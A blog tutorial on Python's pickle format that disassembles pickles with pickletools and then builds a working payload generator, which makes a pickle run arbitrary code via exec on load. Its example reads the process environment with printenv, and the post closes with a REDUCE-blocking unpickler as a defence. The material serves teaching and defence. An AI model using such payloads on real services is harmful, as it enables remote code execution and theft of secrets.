---
title: Tricky Pickle
date: 2021-12-19
---

Everybody knows Python's `pickle` module has prickly edges, just like a real pickle. The [documentation](https://docs.python.org/3/library/pickle.html) even has a big red box right at the top. The `pickle` file format is technically a program for the pickle stack machine, nicely described in [`Lib/pickletools.py`](https://github.com/python/cpython/blob/main/Lib/pickletools.py). Briefly, instructions (opcodes) create Python primitives (`int`s, `str`s, `tuple`s, etc.) on a stack. Some extra bits are used to:
* preserve object references across serialization (e.g. if you save a list containing the same object twice, it will be deserialized into the same list rather than a list with two different objects with the same values)
* de-duplicate references via a memoization table (an array of already-deserialized objects)
* run custom deserialization code on objects

Let's take a quick look inside a pickle using the `pickletools` standard library module.

```python
import pickle

# Serialize a very simple Python object so we can see the structure of a pickle
with open("out.pkl", "wb") as f:
    # Save the number '0x10'
    pickle.dump(0x10, f)
```

First let's inspect the raw bytes of `out.pkl` with `xxd`

```python
!xxd out.pkl
```

    00000000: 8004 4b10 2e                             ..K..

Only 5 bytes, it's practically a nibble. The 0x10 is in there but it still looks mostly like gobbledegook. That's where `pickletools.dis` comes in

```python
import pickletools

with open("out.pkl", "rb") as f:
    # Read the pickle and dump out a readable version
    pickletools.dis(f)
```

        0: \x80 PROTO      4
        2: K    BININT1    16
        4: .    STOP
    highest protocol among opcodes = 2

The output here is thankfully small since the pickle is just a few bytes. In a nutshell, this program pushes 0x10 (decimal 16) on the stack, then pops it off and returns it up. For each one:
* [`PROTO`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2123) - a version number for the bytes in the pickle (not technically required)
* [`BININT1`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L1196) - read a 1 byte unsigned integer
* [`STOP`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2135) - stop reading bytes (useful if multiple pickles are embedded in the same file)

## `REDUCE`

Pokies of pricklies is the `REDUCE` opcode. When the pickle stack machine runs a `REDUCE` instruction, it will pop from the stack a global reference (in the form of `<module>.<attribute>`, like `__builtin__.print` or `sys.exit`) and a tuple of arguments. So if a malicious user can control the input to the `REDUCE` opcode (which is trivial as we will see if you unpickle user input) they have code execution. When is this actually used? If an object undergoing pickling implements `__reduce__`, it can return these two things (the reference and the argument tuple)

```python
class MyClass:
    def __init__(self, x):
        self.x = x
    
    def __reduce__(self):
        return (MyClass, (100,))

m = MyClass(12)
pickletools.dis(pickle.dumps(m))
```

        0: \x80 PROTO      4
        2: \x95 FRAME      30
       11: \x8c SHORT_BINUNICODE '__main__'
       21: \x94 MEMOIZE    (as 0)
       22: \x8c SHORT_BINUNICODE 'MyClass'
       31: \x94 MEMOIZE    (as 1)
       32: \x93 STACK_GLOBAL
       33: \x94 MEMOIZE    (as 2)
       34: K    BININT1    100
       36: \x85 TUPLE1
       37: \x94 MEMOIZE    (as 3)
       38: R    REDUCE
       39: \x94 MEMOIZE    (as 4)
       40: .    STOP
    highest protocol among opcodes = 4

This one is a bit bigger with some special opcodes since pickle has special handling for built-in simple objects like `int` and `list` but not the custom `MyClass`. Consult the docs for details, but long story short `MEMOIZE` codes and `FRAME` are unnecessary:

```
    0: \x80 PROTO      4
   11: \x8c SHORT_BINUNICODE '__main__'
   22: \x8c SHORT_BINUNICODE 'MyClass'
   32: \x93 STACK_GLOBAL
   34: K    BININT1    100
   36: \x85 TUPLE1
   38: R    REDUCE
   40: .    STOP
highest protocol among opcodes = 4
```

It helps to read it from top to bottom since that's the way the stack will see things. This pickle program will `REDUCE` (call) a `STACK_GLOBAL` (a reference, here `__main__.MyClass`) with the argument `TUPLE1` (here `tuple(100)`). This also helpfully shows us what we need to replicate in order to execute arbitrary code.

## Making Pickles

We're going to stop with `pickle.dump` and drop down into saving bytes manually now. `pickletools` will help once again since it contains a nice opcode database out-of-the-box.

```python
def to_int(i):
    # go from pickletools' opcode description to the byte it represents
    return int(i[2:], 16) if i.startswith("\\x") else ord(i)

# dict of opcode name -> opcode value
codes = {c.name: to_int(c.code) for c in pickletools.opcodes}

# this helper function will make it easier for us to build pickles
def construct(*args):
    data = []

    for i in args:
        if isinstance(i, str):
            # encode strings as len, string data as specified by the
            # BINUNICODE opcodes
            i_bytes = i.encode()
            data.append(len(i_bytes))
            data += i_bytes
        elif isinstance(i, int):
            # add ints directly to the byte stream
            data.append(i)

    return bytes(data)
```

First let's use this API to build the simple pickle from earlier and verify that it is correct via `pickletools`.

```python
data = construct(
    codes["BININT1"],
    0x10,
    codes["STOP"],
)

pickletools.dis(data)
```

        0: K    BININT1    16
        2: .    STOP
    highest protocol among opcodes = 1

(note that `PROTO` isn't strictly required). That was easy enough, now let's actually call some Python function with `REDUCE` and `exec`.

```python
data = construct(
    codes["SHORT_BINUNICODE"],
    "__builtin__",
    codes["SHORT_BINUNICODE"],
    "exec",
    codes["STACK_GLOBAL"],
    codes["SHORT_BINUNICODE"],
    "print('hello from pickle')",
    codes["TUPLE1"],
    codes["REDUCE"],
    codes["STOP"],
)

pickle.loads(data)
```

    hello from pickle

Wowza! This pickle ran the Python code stored as a string in the pickle data via the Python builtin `exec`. We can gussy this up a bit with `inspect` to make crafting payloads easier.

```python
import inspect

def call_function_from_pickle(fn):
    """
    Return a pickle that runs 'fn' when it is 'pickle.load'-ed
    """
    return construct(
        codes["SHORT_BINUNICODE"],
        "__builtin__",
        codes["SHORT_BINUNICODE"],
        "exec",
        codes["STACK_GLOBAL"],
        codes["SHORT_BINUNICODE"],
        inspect.getsource(fn).strip() + f"\n{fn.__name__}()",
        codes["TUPLE1"],
        codes["REDUCE"],
        codes["STOP"],
    )
```

This will create a pickle containing the code of whatever function `fn` is passed in as text.

```python
def show_environment():
    import subprocess

    proc = subprocess.run(["printenv"], stdout=subprocess.PIPE, encoding="utf-8")
    print(proc.stdout)

data = call_function_from_pickle(show_environment)

pickle.loads(data)
```

    MY_SECRET=i dont know how to cook beans without microwaving them
    

That's looking pretty nice, and it'd be simple now to instead of `print`-ing that (sensitive) data out that it is shipped off to some attacker-controlled server via `urllib`.

## What?

This is great but accepting everyone pretty much knows not to load random pickles at this point. If you're really paranoid you can disable `REDUCE` opcodes entirely by messing with some `pickle` internals

```python
import io

def no_reduce(*args):
    raise RuntimeError("no REDUCE-ing allowed!")

# Create a custom unpickler
class MyUnpickler(pickle._Unpickler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        # When pickle sees a REDUCE, it will try to access this entry in the
        # table, so make it a stub that throws an error
        self.dispatch[pickle.REDUCE[0]] = no_reduce

malicious_bytes = call_function_from_pickle(show_environment)
MyUnpickler(file=io.BytesIO(malicious_bytes)).load()
```

    ---------------------------------------------------------------------------

    RuntimeError                              Traceback (most recent call last)

    /tmp/ipykernel_396000/12930.py in <module>
         16 
         17 malicious_bytes = call_function_from_pickle(show_environment)
    ---> 18 MyUnpickler(file=io.BytesIO(malicious_bytes)).load()
    

    ~/miniconda3/lib/python3.9/pickle.py in load(self)
       1210                     raise EOFError
       1211                 assert isinstance(key, bytes_types)
    -> 1212                 dispatch[key[0]](self)
       1213         except _Stop as stopinst:
       1214             return stopinst.value

    /tmp/ipykernel_396000/12930.py in no_reduce(*args)
          2 
          3 def no_reduce(*args):
    ----> 4     raise RuntimeError("no REDUCE-ing allowed!")
          5 
          6 

    RuntimeError: no REDUCE-ing allowed!
